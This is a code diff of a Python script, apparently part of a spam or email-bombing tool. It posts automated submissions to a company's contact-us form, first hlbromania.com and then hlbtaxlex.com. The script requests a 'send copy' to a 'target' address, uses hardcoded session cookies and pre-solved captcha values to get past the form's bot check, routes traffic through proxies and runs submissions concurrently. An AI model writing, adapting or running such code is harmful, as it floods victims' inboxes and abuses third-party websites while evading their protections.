@@ -5,10 +5,9 @@ import requests
 from module import Spam
 
 cookies = {
-    'PHPSESSID': '12e61ceab867267cae91afdf0d865914',
-    '_icl_current_language': 'en',
-    '_ga': 'GA1.2.1440276573.1677576943',
-    '_gid': 'GA1.2.493053864.1677576943',
+    'PHPSESSID': '67dc13c8291b652bb3bacfcfad456d86',
+    '_ga': 'GA1.2.1884665157.1677578700',
+    '_gid': 'GA1.2.1558241747.1677578700',
     '_gat': '1',
 }
 
@@ -17,10 +16,10 @@ headers = {
     'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
     'Cache-Control': 'no-cache',
     'Connection': 'keep-alive',
-    # 'Cookie': 'PHPSESSID=12e61ceab867267cae91afdf0d865914; _icl_current_language=en; _ga=GA1.2.1440276573.1677576943; _gid=GA1.2.493053864.1677576943; _gat=1',
-    'Origin': 'https://www.hlbromania.com',
+    # 'Cookie': 'PHPSESSID=67dc13c8291b652bb3bacfcfad456d86; _ga=GA1.2.1884665157.1677578700; _gid=GA1.2.1558241747.1677578700; _gat=1',
+    'Origin': 'https://www.hlbtaxlex.com',
     'Pragma': 'no-cache',
-    'Referer': 'https://www.hlbromania.com/contact-us/',
+    'Referer': 'https://www.hlbtaxlex.com/contact-us/',
     'Sec-Fetch-Dest': 'document',
     'Sec-Fetch-Mode': 'navigate',
     'Sec-Fetch-Site': 'same-origin',
@@ -45,24 +44,24 @@ class ConcreteSpam(Spam):
             'fieldSubject': self.get_text(),
             'fieldMessage': 'test',
             'fieldSendCopy': 'yes',
-            'captcha_1': '993296054',
-            'captcha': 'mbtvp5',
+            'captcha_1': '809447139',
+            'captcha': 'zrhfl6',
             'contact_us_form': '',
             'enter_your_email_for_get_notification': target,
             'contact-us': '',
         }
 
-        response = requests.post('https://www.hlbromania.com/contact-us/', cookies=cookies, headers=headers, data=data,
+        response = requests.post('https://www.hlbtaxlex.com/contact-us/', cookies=cookies, headers=headers, data=data,
                                  proxies=self.get_proxies())
         return response
 
 
 def main():
-    s = 'success'
+    s = 'succesfully'
     spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
     res = spam.send_post()
     if res:
-        spam.run_concurrently(10)
+        spam.run_concurrently(1)
 
 
 if __name__ == '__main__':
